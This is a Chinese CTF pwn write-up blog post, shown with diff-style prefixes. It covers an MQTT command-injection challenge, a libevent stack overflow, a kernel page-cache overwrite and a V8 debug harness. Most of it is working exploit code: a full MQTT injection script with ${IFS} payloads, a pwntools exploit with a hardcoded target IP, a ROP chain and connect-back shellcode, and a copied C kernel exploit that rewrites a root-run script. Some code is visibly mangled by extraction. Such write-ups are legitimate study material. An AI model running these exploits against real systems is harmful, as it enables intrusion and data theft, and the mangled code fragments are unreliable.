+<p><strong>绕过方法</strong>：非常简单。只要我们向该 Topic 发布消息时，构造的 JSON payload 里的 <code>clientid</code><strong>不是</strong><code>httpclient</code>（例如 <code>&#123;&quot;clientid&quot;:&quot;hacker&quot;, ...&#125;</code>），或者干脆不发合法的 JSON 格式，<code>if</code> 条件就会为假，从而顺利进入 <code>else</code> 分支，调用 <code>http(v9)</code>。</p>
+</blockquote>
+<p>进入v9以后，就来到了我们一开始给的那个http函数里</p>
+<blockquote>
+<ol>
+<li>程序用 <code>snprintf</code> 拼接命令 <code>cat /home/ctf/</code> 和变量 <code>s</code>。</li>
+<li>然后严格检查 <code>if ( !strcmp(s, &quot;index_html&quot;) )</code>。只有当 <code>s</code><strong>完全等于</strong><code>&quot;index_html&quot;</code> 时，才会执行 <code>popen(cmd, &quot;r&quot;)</code>。</li>
+<li>如果 <code>s</code> 只能是 <code>&quot;index_html&quot;</code>，那么执行的命令被死死钉在了 <code>cat /home/ctf/index_html</code>，你无法直接通过注入 <code>; cat flag</code> 来改变 <code>s</code> 的值，因为那样会导致 <code>strcmp</code> 失败。</li>
+</ol>
+</blockquote>
+<p>我们可以用&#x2F;x00来截断</p>
+<p>然后通过两次写，来让我们的cat flag指令进行</p>
+<p>第一步我们要把</p>
+<pre><code class="language-bash">cat /home/ctf/index_html;cat$&#123;IFS&#125;flag*$&#123;IFS&#125;# 
+</code></pre>
+<p>这个写入cmd这个全局变量，不通过检查</p>
+<p>然后第二次我们只写前面的cat &#x2F;home&#x2F;ctf&#x2F;index_html。覆盖掉它。让它通过检查然后执行就可以</p>
+<p>检查通过之后执行</p>
+<pre><code class="language-c">stream = popen(cmd, &quot;r&quot;);
+</code></pre>
+<p>这是利用思路。我们可以调用 paho.mqtt  这样的库来帮我们写这个协议栈</p>
+<p>不过它会自动填充一些东西，不是很好控制。我们需要学习然后自己手工去写</p>
+<p>而且我们需要利用&#x2F;00来截断，所以不能轻易使用这个库</p>
+<ol>
+<li>MQTT 协议的特色。MQTT 报文的“剩余长度”字段使用的是一种叫做“可变长度编码（Variable Byte Integer）”的算法。手动实现这个算法，计算出我们要发送的恶意 payload 的真实字节长度。  </li>
+<li>MQTT 协议规定，所有的字符串前面必须带上两个字节（16位）来表示这个字符串的长度。使用 <code>struct.pack(&quot;!H&quot;, len(s))</code> （大端序无符号短整型）手动拼凑这个头部。</li>
+<li><pre><code>不用管什么 JSON 格式，  直接把 Topic 和我们传入的原始字节（`payload`）拼接在一起，加上报文头（`0x30` 代表 PUBLISH），然后通过最底层的 `socket.sendall()` 把这串字节流硬生生地塞进网络管道。
+</code></pre>
+</li>
+</ol>
+<h3 id="在有的脚本中还有后台监听"><a href="#在有的脚本中还有后台监听" class="headerlink" title="在有的脚本中还有后台监听"></a>在有的脚本中还有后台监听</h3><p><strong>双线程并发</strong>： 这里启动了一个后台线程，专门用来跑 <code>reader_loop</code> 函数。这样主线程在狂发恶意请求的时候，后台看着 MQTT 服务器。</p>
+<pre><code class="language-python"># 建立一个接收端的 MQTT 客户端
+sub = MQTTClient(HOST, PORT)
+sub.subscribe(TOPIC, qos=0)
+# 开启后台守护线程监听
+t = threading.Thread(target=reader_loop, args=(sub,), daemon=True)
+t.start()
+</code></pre>
+<p><strong>精准截获与解析 (</strong><code>**reader_loop**</code>** 函数中)**： 这个循环一直在读取 Socket 数据。当它发现收到的是一个 PUBLISH 报文（<code>pkt_type == 3</code>）时，它会把 payload 剥离出来。</p>
+<pre><code class="language-python">if pkt_type != 3: # 只处理别人发布过来的消息
+    continue
+# ... 解析出 topic 和 payload ...
+</code></pre>
+<p><strong>过滤与Flag</strong>： 它尝试把收到的字节流当做 JSON 解析。如果确认是服务端发来的（<code>clientid</code> 是 <code>&quot;httpclient&quot;</code>），就把里面的 <code>message</code> 字段提出来。 如果包含 <code>flag&#123;</code> 或 <code>ctf&#123;</code> 这种敏感字眼，就用 <code>[!!!]</code> 给你打印在屏幕上！</p>
+<pre><code class="language-python">obj = json.loads(txt)
+if obj.get(&quot;clientid&quot;) == &quot;httpclient&quot;: # 确认是服务端的回显
+    msg = obj.get(&quot;message&quot;, &quot;&quot;)
+    print(f&quot;[sub] httpclient =&gt; &#123;msg&#125;&quot;) # 打印所有回显
+    # 自动化审计，发现 flag 立刻报警
+    if &quot;flag&#123;&quot; in msg.lower() or &quot;ctf&#123;&quot; in msg.lower():
+        print(f&quot;[!!!] maybe flag =&gt; &#123;msg&#125;&quot;)
+</code></pre>
+<hr>
+<h3 id="容错机制"><a href="#容错机制" class="headerlink" title="容错机制"></a>容错机制</h3><p>出题人把 Flag 放在哪里，叫什么名字都是不知道的。而且这个也没有返回来显示的提示。如果一上来就去读 <code>/flag</code>，很有可能会出错。flag文件叫这个<code>/home/ctf/flag.txt</code> 就会读不出来</p>
+<p><strong>精心构造的 <strong><code>**cmds**</code></strong> 列表</strong>： 每次循环，脚本都会拿出一个命令，喂给 <code>trigger(cmd)</code> 去执行那套“两步走”的利用。（这道题）</p>
+<pre><code class="language-python">cmds = [
+    &quot;echo$&#123;IFS&#125;PWNED&quot;,   # 第一脚踢门：如果监听线程打印出 PWNED，说明命令注入 100% 成功了！
+    &quot;echo$&#123;IFS&#125;$PWD&quot;,    # 第二步侦察：我在哪？(通常是 /home/ctf 或者 /)
+    &quot;echo$&#123;IFS&#125;*&quot;,       # 第三步翻箱倒柜：利用 Linux 的 * 通配符，把当前目录下的所有文件名全打印出来！
+    &quot;cat$&#123;IFS&#125;f*&quot;,       # 第四步盲狙：读取所有以 f 开头的文件
+    &quot;cat$&#123;IFS&#125;flag*&quot;,    # 第五步盲狙：读取所有以 flag 开头的文件
+    &quot;cat$&#123;IFS&#125;*flag*&quot;,   # 第六步盲狙：前后夹击，只要文件名里带 flag 就全读出来
+]
+</code></pre>
+<p><em>注：使用 <em><code>_$&#123;IFS&#125;_</code></em> 是因为在 HTTP 协议和 <em><code>_snprintf_</code></em> 拼接时，空格极容易导致截断或解析失败，所以用 <em><code>_$&#123;IFS&#125;_</code></em>（内部字段分隔符）代替空格。</em></p>
+<p><strong>稳健的循环</strong></p>
+<pre><code class="language-python">for cmd in cmds:
+    try:
+        trigger(cmd) # 执行 Stage 1 (埋雷) 和 Stage 2 (引爆)
+    except Exception as e:
+        print(&quot;[!] error:&quot;, e) # 就算某个命令让服务端崩了一下，也不影响下一个命令继续打
+</code></pre>
+<p>每一次 <code>trigger(cmd)</code> 都会经历：组装带 <code>\x00</code> 的变异 HTTP 请求 -&gt; 发送投毒 -&gt; 等待 0.5 秒 -&gt; 发送正常请求引爆漏洞 -&gt; 监听线程抓取回显结果。</p>
+<p>这样脚本在不知道环境到底是什么情况的时候，就可以通过这种方法。把flag拿出来</p>
+<pre><code class="language-python">#!/usr/bin/env python3
+import socket
+import struct
+import threading
+import time
+import json
+import random
+import sys
+
+HOST = sys.argv[1]
+PORT = int(sys.argv[2])
+TOPIC = &quot;HTTP&quot;
+
+def pack_str(s):
+    if isinstance(s, str):
+        s = s.encode()
+    return struct.pack(&quot;!H&quot;, len(s)) + s
+
+def enc_varint(x):
+    out = b&quot;&quot;
+    while True:
+        b = x % 128
+        x //= 128
+        if x &gt; 0:
+            b |= 0x80
+        out += bytes([b])
+        if x == 0:
+            return out
+
+def recv_exact(sock, n):
+    data = b&quot;&quot;
+    while len(data)  63:
+        raise ValueError(f&quot;payload too long (&#123;len(inj)&#125; &gt; 63): &#123;inj&#125;&quot;)
+    return f&quot;GET /ctf/&#123;inj&#125; HTTP/1.1\r\n\r\n\x00&quot;.encode()
+
+def make_stage2():
+    return b&quot;GET /ctf/index_html HTTP/1.1\r\n\r\n\x00&quot;
+
+def trigger(cmd):
+    print(&quot;=&quot; * 60)
+    print(&quot;[+] cmd =&quot;, cmd)
+    publish_once(make_stage1(cmd))
+    time.sleep(0.5)
+    publish_once(make_stage2())
+    time.sleep(2.5)
+
+def reader_loop(sub):
+    while sub.running:
+        try:
+            first = recv_exact(sub.sock, 1)[0]
+        except EOFError:
+            break
+        rem = recv_varint(sub.sock)
+        body = recv_exact(sub.sock, rem)
+        pkt_type = first &gt;&gt; 4
+
+        if pkt_type != 3:
+            continue
+
+        off = 0
+        topic, off = parse_str(body, off)
+        payload = body[off:]
+
+        try:
+            txt = payload.decode(&quot;utf-8&quot;, &quot;ignore&quot;).rstrip(&quot;\x00\r\n&quot;)
+        except:
+            txt = repr(payload)
+
+        print(f&quot;[sub] topic=&#123;topic.decode(errors=&#39;ignore&#39;)&#125; raw=&#123;txt&#125;&quot;)
+
+        try:
+            obj = json.loads(txt)
+            if obj.get(&quot;clientid&quot;) == &quot;httpclient&quot;:
+                msg = obj.get(&quot;message&quot;, &quot;&quot;)
+                print(f&quot;[sub] httpclient =&gt; &#123;msg&#125;&quot;)
+                if &quot;flag&#123;&quot; in msg.lower() or &quot;ctf&#123;&quot; in msg.lower():
+                    print(f&quot;[!!!] maybe flag =&gt; &#123;msg&#125;&quot;)
+        except:
+            pass
+
+def main():
+    sub = MQTTClient(HOST, PORT)
+    sub.connect(f&quot;sub&#123;random.randint(1000,9999)&#125;&quot;)
+    sub.subscribe(TOPIC, qos=0)
+
+    t = threading.Thread(target=reader_loop, args=(sub,), daemon=True)
+    t.start()
+
+    print(&quot;[+] wait 3 seconds for heartbeat...&quot;)
+    time.sleep(3)
+
+    cmds = [
+        &quot;echo$&#123;IFS&#125;PWNED&quot;,
+        &quot;echo$&#123;IFS&#125;$PWD&quot;,
+        &quot;echo$&#123;IFS&#125;*&quot;,
+        &quot;cat$&#123;IFS&#125;f*&quot;,
+        &quot;cat$&#123;IFS&#125;flag*&quot;,
+        &quot;cat$&#123;IFS&#125;*flag*&quot;,
+    ]
+
+    for cmd in cmds:
+        try:
+            trigger(cmd)
+        except Exception as e:
+            print(&quot;[!] error:&quot;, e)
+
+    print(&quot;[+] keep listening 5 seconds...&quot;)
+    time.sleep(5)
+    sub.running = False
+    sub.close()
+
+if __name__ == &quot;__main__&quot;:
+    main()
+</code></pre>
+<h1 id="SUctf"><a href="#SUctf" class="headerlink" title="SUctf"></a>SUctf</h1><p>漏洞：</p>
+<h1 id=""><a href="#" class="headerlink" title=""></a></h1><h3 id="evbuffer"><a href="#evbuffer" class="headerlink" title="evbuffer"></a>evbuffer</h3><p>漏洞：</p>
+<pre><code class="language-python">unsigned __int64 __fastcall send_data_with_hostname(__int64 a1, _BYTE *a2, int recv_len, const struct sockaddr *a4)
+&#123;
+  ...
+  v14 = __readfsqword(0x28u);
+  if ( recv_len &gt; 0 )
+  &#123;
+    a2[recv_len] = 0;
+    s = malloc(0x50uLL);
+    if ( s )
+    &#123;
+      memset(s, 0, 0x50uLL);
+      if ( inet_pton(2, a2, (char *)s + 4) )
+      &#123; 
+        memcpy((void *)a1, a2, recv_len);
+&#125;
+</code></pre>
+<p>分析可知道</p>
+<p>memcpy。它直接将用户输入 <code>a2</code> 复制到地址 <code>a1</code> 中，长度完全由接收到的 recv_len 决定。如果 a1 是一个位于栈上的固定大小缓冲区，且程序没有限制我们的输入长度。</p>
+<p>程序有栈溢出。没有libc</p>
+<p> 因为这是一个网络服务程序，如果只用bin&#x2F;sh，Shell 可能会开在服务器本地，我们通过网络根本连不上。所以我们需要手写一段网络交互的 Shellcode  </p>
+<p>那应该就是那几个串起来，ORW，泄露libc。栈溢出泄露libc和栈地址</p>
+<p>我们最后的ORW还要放到栈上执行，所以需要用 mprotect  把权限开了。然后再执行我们的shellcode</p>
+<p><strong>利用 TCP泄露 Libevent 与 Libc 地址</strong></p>
+<p>当向 TCP 端口发送 <code>127.0.0.1\0</code> 并接收一段 0x50 长度的数据时，在偏移 0x48 处，残留着 <code>libevent</code> 库中的某个指针。</p>
+<ul>
+<li>利用公式计算基址：</li>
+</ul>
+<p>Base_libevent &#x3D; Addr_leak - 0x13b1a</p>
+<p>Base_libc &#x3D; Base_libevent - 0x249000</p>
+<p><strong>2. 泄露栈地址（利用 UDP）</strong></p>
+<p>同样的逻辑，我们向 UDP 端口发送短数据。在 UDP 处理流程的栈结构中，偏移 <code>0x40</code> 的位置残留着一个栈指针。</p>
+<ul>
+<li>计算出我们可控缓冲区的起始栈地址：</li>
+</ul>
+<p>Addr_stack &#x3D; Addr_leak - 0x3e0</p>
+<p>倒是每个地方不是很难，就是结合起来比较复杂</p>
+<pre><code class="language-python">from pwn import *
+
+
+ip = &#39;101.245.104.190&#39;
+t_port = 10003
+u_port = 10013
+
+# 为了拿 libevent 的地址，进而算 libc
+p = remote(ip, t_port)
+p.send(b&#39;127.0.0.1\0&#39;) 
+data = p.recv(0x50) 
+p.close()
+
+libevent_addr = u64(data[0x48:0x48+8])
+libevent_base = libevent_addr - 0x13b1a
+print(&quot;find_libevent_addr: &quot; + hex(libevent_base))
+
+
+libc_base = libevent_base - 0x249000
+print(&quot;calaulate_libc_addr: &quot; + hex(libc_base))
+
+#用 UDP 协议拿栈地址
+p2 = remote(ip, u_port, typ=&quot;udp&quot;)
+p2.send(b&#39;127.0.0.1\0&#39;)
+data2 = p2.recv(0x50)
+p2.close()
+
+stack_addr = u64(data2[0x40:0x40+8]) - 0x3e0
+print(&quot;找到栈地址了: &quot; + hex(stack_addr))
+
+# 第三次正式开始攻击
+p3 = remote(ip, t_port)
+
+# 准备 Shellcode，用来读 flag
+my_shellcode = asm(&#39;&#39;&#39;
+    xor esi, esi
+    mul rsi
+    inc esi
+    mov edi, esi
+    inc edi
+    mov al, 41
+    syscall
+    mov edi, eax
+    mov rbx, 0x9f0ca208c9ea0002
+    push rbx
+    mov rsi, rsp
+    mov dl, 16
+    mov al, 42
+    syscall
+    xor esi, esi
+    mov al, 33
+    syscall
+    inc esi
+    mov al, 33
+    syscall
+    inc esi
+    mov al, 33
+    syscall
+    mov eax, 0x67616c66
+    push rax
+    mov rdi, rsp
+    xor eax, eax
+    mov esi, eax
+    mov al, 2
+    syscall
+    push rax
+    mov rsi, rsp
+    xor eax, eax
+    mov edx, eax
+    inc eax
+    mov edi, eax
+    mov dl, 8
+    syscall
+    pop rax
+    test rax, rax
+    js over
+    mov edi, eax
+    mov rsi, rsp
+    mov edx, 1024
+    xor eax, eax
+    syscall
+    mov edx, eax
+    mov rsi, rsp
+    xor eax, eax
+    inc eax
+    mov edi, eax
+    syscall
+over:
+    xor edi, edi
+    mov eax, 60
+    syscall
+&#39;&#39;&#39;, arch=&#39;amd64&#39;)
+
+
+payload = b&#39;127.0.0.1\0&#39;
+payload += b&#39;A&#39; * 22  
+payload += p64(1)
+payload += p64(stack_addr - 0x110) 
+
+payload += p64(0) * 1 
+payload += p64(stack_addr) # 0x8
+payload += p64(stack_addr) # 0x10
+payload += b&#39;\0&#39; * (0x30 - 0x18)
+payload += p64(0) # 0x30
+payload += b&#39;\0&#39; * (0x68 - 0x38)
+payload += p64(stack_addr &amp; 0xfffffffffffff000) # 0x68
+payload += p64(0x1000) # 0x70
+payload += p64(stack_addr + 0x100) # 0x78
+payload += b&#39;\0&#39; * (0x88 - 0x80)
+payload += p64(7) # 0x88
+payload += b&#39;\0&#39; * (0xa0 - 0x90)
+payload += p64(stack_addr + 0x1d0) # 0xa0
+payload += p64(libc_base + 0x11eb20)
+payload += b&#39;\0&#39; * (0xe0 - 0xb0)
+payload += p64(stack_addr)
+payload += b&#39;\0&#39; * (0x100 - 0xe8)
+payload += p64(stack_addr + 0x100)
+payload += b&#39;\0&#39; * 8
+payload += p64(libc_base + 0x539e0) 
+payload += b&#39;\0&#39; * 8
+payload += p64(1)
+payload += b&#39;\0&#39; * (0x1d0 - 0x128)
+payload += p64(stack_addr + 0x1f0) 
+payload += b&#39;\0&#39; * (0x1f0 - 0x1d8)
+payload += my_shellcode 
+
+print(&quot;Payload_len: &quot; + str(len(payload)))
+p3.send(payload)
+
+p3.close()
+</code></pre>
+<h3 id="EzRouter"><a href="#EzRouter" class="headerlink" title="EzRouter"></a>EzRouter</h3><p>这直接加载出来一个路由器界面</p>
+<p>进入后台后可以下载固件。其中有一个 http 文件。</p>
+<p>这看不出来漏洞，不知道往哪个方向利用</p>
+<h3 id="Chronos-Ring1"><a href="#Chronos-Ring1" class="headerlink" title="Chronos_Ring1"></a>Chronos_Ring1</h3><h3 id="Chronos-Ring"><a href="#Chronos-Ring" class="headerlink" title="Chronos_Ring"></a>Chronos_Ring</h3><p>这两个是什么题，拿ai分析了说是</p>
+<p><strong>Chronos_Ring</strong> 是一道非常经典的 Linux 内核（Kernel）Pwn 题。它没有让你去构造复杂的 ROP 链或者堆溢出布局，而是侧重于对<strong>内核语义逻辑</strong>的理解。</p>
+<p>这道题的核心矛盾点在于：<strong>一个具备“修改文件 Page Cache”能力的内核驱动，撞上了一个“定期以 Root 权限执行”的脚本。</strong></p>
+<hr>
+<p><strong>这个应该是能知道它的问题在哪的，但是不会写具体的利用脚本</strong></p>
+<p><strong>（后面看了别人的复现，是拿c写的</strong></p>
+<p>** 主要是虽然你在文件系统中没有写的权限，但驱动提供的接口允许你从内核维度强行修改该文件在内存中的映射副本。  ）**</p>
+<p><strong>这里放一下别人的exp:</strong></p>
+<pre><code class="language-c">#include 
+
+#define AT_FDCWD -100
+
+#define O_RDONLY 0
+#define O_RDWR 2
+
+#define SYS_read 0
+#define SYS_write 1
+#define SYS_close 3
+#define SYS_ioctl 16
+#define SYS_nanosleep 35
+#define SYS_openat 257
+#define SYS_exit 60
+
+#define CHRONOS_CREATE 0x1001
+#define CHRONOS_AUTH 0x1002
+#define CHRONOS_PIN_USER 0x1003
+#define CHRONOS_ATTACH_FILE 0x1004
+#define CHRONOS_MAKE_VIEW 0x1005
+#define CHRONOS_COPY_TO_VIEW 0x1008
+
+struct timespec &#123;
+    int64_t tv_sec;
+    int64_t tv_nsec;
+&#125;;
+
+struct auth_req &#123;
+    uint64_t key;
+    uint32_t seed;
+    uint32_t pad;
+&#125;;
+
+struct write_req &#123;
+    uint64_t user_buf;
+    uint32_t len;
+    uint32_t off;
+&#125;;
+
+struct attach_req &#123;
+    int32_t fd;
+    uint32_t index;
+&#125;;
+
+struct copy_req &#123;
+    uint64_t pad;
+    uint32_t len;
+    uint32_t off;
+&#125;;
+
+static const uint64_t auth_const = 0xf372fe94f82b3c6eULL;
+static const uint64_t auth_base = 0x0ffffffff8100000ULL;
+static const uint64_t auth_step = 0x20000ULL;
+static const uint64_t auth_tries = 0x2000ULL;
+
+static const char dev_path[] = &quot;/dev/chronos_ring&quot;;
+static const char job_path[] = &quot;/tmp/job&quot;;
+static const char flag_path[] = &quot;/flag&quot;;
+
+static const char payload[] =
+    &quot;#!/bin/sh\n&quot;
+    &quot;chmod 644 /flag\n&quot;
+    &quot;#\n&quot;
+    &quot;################################&quot;;
+
+static char scratch[0x1000];
+
+static inline long syscall0(long nr) &#123;
+    long ret;
+
+    __asm__ volatile(
+        &quot;syscall&quot;
+        : &quot;=a&quot;(ret)
+        : &quot;a&quot;(nr)
+        : &quot;rcx&quot;, &quot;r11&quot;, &quot;memory&quot;);
+    return ret;
+&#125;
+
+static inline long syscall1(long nr, long a1) &#123;
+    long ret;
+
+    __asm__ volatile(
+        &quot;syscall&quot;
+        : &quot;=a&quot;(ret)
+        : &quot;a&quot;(nr), &quot;D&quot;(a1)
+        : &quot;rcx&quot;, &quot;r11&quot;, &quot;memory&quot;);
+    return ret;
+&#125;
+
+static inline long syscall2(long nr, long a1, long a2) &#123;
+    long ret;
+
+    __asm__ volatile(
+        &quot;syscall&quot;
+        : &quot;=a&quot;(ret)
+        : &quot;a&quot;(nr), &quot;D&quot;(a1), &quot;S&quot;(a2)
+        : &quot;rcx&quot;, &quot;r11&quot;, &quot;memory&quot;);
+    return ret;
+&#125;
+
+static inline long syscall3(long nr, long a1, long a2, long a3) &#123;
+    long ret;
+
+    __asm__ volatile(
+        &quot;syscall&quot;
+        : &quot;=a&quot;(ret)
+        : &quot;a&quot;(nr), &quot;D&quot;(a1), &quot;S&quot;(a2), &quot;d&quot;(a3)
+        : &quot;rcx&quot;, &quot;r11&quot;, &quot;memory&quot;);
+    return ret;
+&#125;
+
+static inline long syscall4(long nr, long a1, long a2, long a3, long a4) &#123;
+    long ret;
+    register long r10 __asm__(&quot;r10&quot;) = a4;
+
+    __asm__ volatile(
+        &quot;syscall&quot;
+        : &quot;=a&quot;(ret)
+        : &quot;a&quot;(nr), &quot;D&quot;(a1), &quot;S&quot;(a2), &quot;d&quot;(a3), &quot;r&quot;(r10)
+        : &quot;rcx&quot;, &quot;r11&quot;, &quot;memory&quot;);
+    return ret;
+&#125;
+
+static inline long openat(int dirfd, const char *path, int flags, int mode) &#123;
+    return syscall4(SYS_openat, dirfd, (long)path, flags, mode);
+&#125;
+
+static inline long close_fd(int fd) &#123;
+    return syscall1(SYS_close, fd);
+&#125;
+
+static inline long do_ioctl(int fd, unsigned long cmd, void *arg) &#123;
+    return syscall3(SYS_ioctl, fd, cmd, (long)arg);
+&#125;
+
+static inline long read_fd(int fd, void *buf, unsigned long len) &#123;
+    return syscall3(SYS_read, fd, (long)buf, len);
+&#125;
+
+static inline long write_fd(int fd, const void *buf, unsigned long len) &#123;
+    return syscall3(SYS_write, fd, (long)buf, len);
+&#125;
+
+static inline void sleep_secs(long secs) &#123;
+    struct timespec ts;
+
+    ts.tv_sec = secs;
+    ts.tv_nsec = 0;
+    syscall2(SYS_nanosleep, (long)&amp;ts, 0);
+&#125;
+
+static inline void exit_now(int code) &#123;
+    syscall1(SYS_exit, code);
+    __builtin_unreachable();
+&#125;
+
+static unsigned long str_len(const char *s) &#123;
+    unsigned long n = 0;
+
+    while (s[n]) &#123;
+        ++n;
+    &#125;
+    return n;
+&#125;
+
+static void write_str(int fd, const char *s) &#123;
+    write_fd(fd, s, str_len(s));
+&#125;
+
+static void write_flag(void) &#123;
+    char buf[128];
+    long fd;
+    long n;
+    int tries;
+
+    for (tries = 0; tries = 0) &#123;
+            n = read_fd((int)fd, buf, sizeof(buf));
+            if (n &gt; 0) &#123;
+                write_fd(1, buf, (unsigned long)n);
+                write_fd(1, &quot;\n&quot;, 1);
+                close_fd((int)fd);
+                exit_now(0);
+            &#125;
+            close_fd((int)fd);
+        &#125;
+        sleep_secs(1);
+    &#125;
+
+    write_str(2, &quot;failed to read /flag\n&quot;);
+    exit_now(1);
+&#125;
+
+static void auth_ring(int fd) &#123;
+    uint64_t i;
+
+    for (i = 0; i  MAX_SCRIPT_SIZE) &#123;
+        System.out.println(&quot;Error: script too large (max 1MB)&quot;);
+        return;
+    &#125;
+
+    // 把当前行追加到脚本内容里，并补一个换行
+    script.append(line).append(&quot;\n&quot;);
+&#125;
+
+// 创建一个 V8 JavaScript 运行时环境
+V8 v8 = V8.createV8Runtime();
+
+// 向 JS 环境注册一个名为 log 的 Java 方法
+// 这样 JS 代码里就可以调用 log(...)，实际会执行这里的 Java 回调
+v8.registerJavaMethod((JavaVoidCallback) (receiver, params) -&gt; &#123;
+    // 如果传入了参数，就打印第一个参数
+    if (params.length() &gt; 0) &#123;
+        System.out.println(params.get(0).toString());
+        System.out.flush();
+    &#125;
+&#125;, &quot;log&quot;);
+
+// 执行前面拼接好的 JS 脚本，并拿到执行结果
+Object result = v8.executeScript(script.toString());
+构建调试版 App
+
+我们可以看到上述这个 app 功能很简略，我们可以重新改一下这个 app，使其具有调试的功能。
+
+修改之后的完整的源码如下（需要同时修改 Dockerfile 和 sh 文件）：
+
+import com.eclipsesource.v8.*;
+import sun.misc.Unsafe;
+
+import java.io.BufferedReader;
+import java.io.InputStreamReader;
+import java.lang.reflect.Field;
+import java.util.Locale;
+
+public class DebugApp &#123;
+    private static final int MAX_SCRIPT_SIZE = 1048576;
+    private static final Unsafe UNSAFE = getUnsafe();
+
+    public static void main(String[] args) throws Exception &#123;
+        System.out.println(&quot;  ____  _   _ ____            &quot;);
+        System.out.println(&quot; / || | | | __ )  _____  &quot;);
+        System.out.println(&quot; \\ \\| | | |  _ \\ / _ \\ \\/ /&quot;);
+        System.out.println(&quot;  ) | || | |) | () &gt;   MAX_SCRIPT_SIZE) &#123;
+                System.out.println(&quot;Error: script too large (max 1MB)&quot;);
+                return;
+            &#125;
+            script.append(line).append(&quot;\n&quot;);
+        &#125;
+
+        if (script.isEmpty()) &#123;
+            System.out.println(&quot;Error: empty script&quot;);
+            return;
+        &#125;
+
+        System.out.println(&quot;[*] Executing...&quot;);
+        System.out.flush();
+
+        V8 v8 = V8.createV8Runtime();
+
+        v8.registerJavaMethod((JavaVoidCallback) (receiver, params) -&gt; &#123;
+            if (params.length() &gt; 0) &#123;
+                System.out.println(params.get(0).toString());
+                System.out.flush();
+            &#125;
+        &#125;, &quot;log&quot;);
+
+        v8.registerJavaMethod((JavaCallback) (receiver, params) -&gt; &#123;
+            Object obj = params.get(0);
+            return hex(nativeHandleOf(obj));
+        &#125;, &quot;addr&quot;);
+
+        v8.registerJavaMethod((JavaCallback) (receiver, params) -&gt; &#123;
+            long addr = parseAddr(params.get(0).toString());
+            return hex(UNSAFE.getLong(addr));
+        &#125;, &quot;read64&quot;);
+
+        v8.registerJavaMethod((JavaCallback) (receiver, params) -&gt; &#123;
+            long addr = parseAddr(params.get(0).toString());
+            long value = Integer.toUnsignedLong(UNSAFE.getInt(addr));
+            return hex(value);
+        &#125;, &quot;read32&quot;);
+
+        v8.registerJavaMethod((JavaCallback) (receiver, params) -&gt; &#123;
+            long addr = parseAddr(params.get(0).toString());
+            int size = params.length() &gt; 1 ? parseSize(params.get(1).toString()) : 0x80;
+            return dump(addr, size);
+        &#125;, &quot;dump&quot;);
+
+        v8.registerJavaMethod((JavaVoidCallback) (receiver, params) -&gt; &#123;
+            long addr = parseAddr(params.get(0).toString());
+            long value = parseAddr(params.get(1).toString());
+            UNSAFE.putLong(addr, value);
+        &#125;, &quot;write64&quot;);
+
+        v8.registerJavaMethod((JavaVoidCallback) (receiver, params) -&gt; &#123;
+            System.gc();
+            System.runFinalization();
+        &#125;, &quot;jgc&quot;);
+
+        try &#123;
+            Object result = v8.executeScript(script.toString());
+            if (result instanceof V8Object) &#123;
+                ((V8Object) result).release();
+            &#125;
+        &#125; catch (Throwable t) &#123;
+            System.out.println(&quot;Error: &quot; + t);
+            t.printStackTrace(System.out);
+        &#125; finally &#123;
+            if (!v8.isReleased()) &#123;
+                v8.release();
+            &#125;
+        &#125;
+    &#125;
+
+    private static Unsafe getUnsafe() &#123;
+        try &#123;
+            Field f = Unsafe.class.getDeclaredField(&quot;theUnsafe&quot;);
+            f.setAccessible(true);
+            return (Unsafe) f.get(null);
+        &#125; catch (Exception e) &#123;
+            throw new RuntimeException(&quot;failed to get Unsafe&quot;, e);
+        &#125;
+    &#125;
+
+    private static long nativeHandleOf(Object obj) &#123;
+        if (!(obj instanceof V8Value)) &#123;
+            throw new IllegalArgumentException(&quot;addr() expects a V8 object/value&quot;);
+        &#125;
+        try &#123;
+            Field f = V8Value.class.getDeclaredField(&quot;objectHandle&quot;);
+            f.setAccessible(true);
+            return f.getLong(obj);
+        &#125; catch (Exception e) &#123;
+            throw new RuntimeException(&quot;failed to read V8Value.objectHandle&quot;, e);
+        &#125;
+    &#125;
+
+    private static long parseAddr(String text) &#123;
+        String s = text.trim().toLowerCase(Locale.ROOT);
+        if (s.startsWith(&quot;0x&quot;)) &#123;
+            s = s.substring(2);
+        &#125;
+        if (s.isEmpty()) &#123;
+            return 0L;
+        &#125;
+        return Long.parseUnsignedLong(s, 16);
+    &#125;
+
+    private static int parseSize(String text) &#123;
+        String s = text.trim().toLowerCase(Locale.ROOT);
+        if (s.startsWith(&quot;0x&quot;)) &#123;
+            return Integer.parseUnsignedInt(s.substring(2), 16);
+        &#125;
+        return Integer.parseInt(s);
+    &#125;
+
+    private static String hex(long value) &#123;
+        return &quot;0x&quot; + Long.toUnsignedString(value, 16);
+    &#125;
+
+    private static String dump(long addr, int size) &#123;
+        StringBuilder sb = new StringBuilder();
+        for (int off = 0; off &lt; size; off += 16) &#123;
+            sb.append(hex(addr + off)).append(&quot;: &quot;);
+            for (int i = 0; i &lt; 16 &amp;&amp; off + i &lt; size; i++) &#123;
+                int b = UNSAFE.getByte(addr + off + i) &amp; 0xff;
+                if (i != 0) &#123;
+                    sb.append(&#39; &#39;);
+                &#125;
+                if (b &lt; 0x10) &#123;
+                    sb.append(&#39;0&#39;);
+                &#125;
+                sb.append(Integer.toHexString(b));
+            &#125;
+            if (off + 16 &lt; size) &#123;
+                sb.append(&#39;\n&#39;);
+            &#125;
+        &#125;
+        return sb.toString();
+    &#125;
+&#125;
+</code></pre>
+<h3 id="BOX"><a href="#BOX" class="headerlink" title="BOX"></a>BOX</h3><p>怎么还有java</p>
+<h2 id="minivfs"><a href="#minivfs" class="headerlink" title="minivfs"></a>minivfs</h2><p>这个是堆题，可以稍微能做了</p>
+<p>先分析一下题目，这道题的glibc版本是 2.41</p>
+<p>高版本libc下面，我们就不能简单的泄露然后利用几个hook就能达到利用的目的。这道题还是有点难</p>
+<p>首先我们拿ai分析有这么一个东西</p>
+<p><img src="https://cdn.nlark.com/yuque/0/2026/png/58878864/1775054938192-7f3e8512-3812-476e-b872-78010b8b004f.png"></p>
+<p>不过绕过这个之后，堆的部分利用思路还是首先需要泄露libc</p>
+<p>有个沙箱那是要在栈上写ORW？</p>
+<p>ai给的建议：</p>
+<p> 由于 Glibc 2.41 没有 Hook，且存在 Seccomp 限制，直接 <code>system</code> 是死路一条。最稳妥的办法是劫持 <code>_IO_list_all</code> 执行 <strong>FSOP (File Stream Oriented Programming)</strong></p>
+
+            
+        </div>
+    </div>
+    <div class="post-tags">
+        
+        <span class="icon">
+            <i class="fa-solid fa-tags fa-fw"></i>
+        </span>
+        
+        
+        
+        <span class="tag">
+            
+            <a href="/tags/CTF/" style="color: #ffa2c4">CTF</a>
+        </span>
+        
